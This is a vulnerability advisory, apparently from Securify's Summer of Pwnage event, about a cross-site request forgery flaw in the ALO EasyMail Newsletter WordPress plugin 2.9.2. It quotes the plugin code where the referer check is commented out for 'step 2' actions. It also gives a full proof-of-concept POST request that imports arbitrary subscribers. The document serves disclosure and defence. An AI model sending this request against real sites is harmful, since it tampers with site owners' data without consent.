@@ -1,0 +1,83 @@
+Cross-Site Request Forgery in ALO EasyMail Newsletter WordPress Plugin
+
+Contact
+
+For feedback or questions about this advisory mail us at sumofpwn at securify.nl
+
+The Summer of Pwnage
+
+This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.
+
+OVE ID
+OVE-20160724-0021
+
+Abstract
+
+It was discovered that the ALO EasyMail Newsletter WordPress Plugin is vulnerable to Cross-Site Request Forgery. Amongst others, this issue can be used to add/import arbitrary subscribers. In order to exploit this issue, the attacker has to lure/force a victim into opening a malicious website/link.
+
+Tested versions
+
+This issue was successfully tested on ALO EasyMail Newsletter WordPress Plugin version 2.9.2.
+
+Fix
+
+This issue is resolved in ALO EasyMail Newsletter version 2.9.3.
+
+Introduction
+
+ALO EasyMail Newsletter is a plugin for WordPress that allows to write and send newsletters, and to gather and manage the subscribers. It supports internationalization and multilanguage. It was discovered that the ALO EasyMail Newsletter WordPress Plugin is vulnerable to Cross-Site Request Forgery.
+
+Details
+
+A number of actions within ALO EasyMail Newsletter consist of two steps. The 'step one' action is protected against Cross-Site Request Forgery by means of the check_admin_referer() WordPress function.
+
+<?php 
+/**
+* Bulk action: Step #1/2
+*/
+if ( isset($_REQUEST['doaction_step1']) ) {
+   check_admin_referer('alo-easymail_subscribers');
+
+However the call to check_admin_referer() has been commented out for all 'step two' actions. Due to this it is possible for an attacker to perform a Cross-Site Request Forgery attack for all the 'step 2' actions.
+
+/**
+* Bulk action: Step #2/2
+*/
+if ( isset($_REQUEST['doaction_step2']) ) {
+   //if($wp_version >= '2.6.5') check_admin_referer('alo-easymail_subscribers');
+
+   
+Amongst others, this issue can be used to add/import arbitrary subscribers. In order to exploit this issue, the attacker has to lure/force a victim into opening a malicious website/link.
+
+Proof of concept
+
+POST /wp-admin/edit.php?post_type=newsletter&page=alo-easymail%2Fpages%2Falo-easymail-admin-subscribers.php&doaction_step2=true&action=import HTTP/1.1
+Host: <target>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: <session cookies>
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------17016644981835490787491067954
+Content-Length: 645
+   
+-----------------------------17016644981835490787491067954
+Content-Disposition: form-data; name="uploaded_csv"; filename="foo.csv"
+Content-Type: text/plain
+   
+sumofpwn@securify.n;Summer of Pwnage;en
+   
+-----------------------------17016644981835490787491067954
+Content-Disposition: form-data; name="post_type"
+   
+newsletter
+-----------------------------17016644981835490787491067954
+Content-Disposition: form-data; name="action"
+   
+import_step2
+-----------------------------17016644981835490787491067954
+Content-Disposition: form-data; name="doaction_step2"
+   
+Upload CSV file
+-----------------------------17016644981835490787491067954--
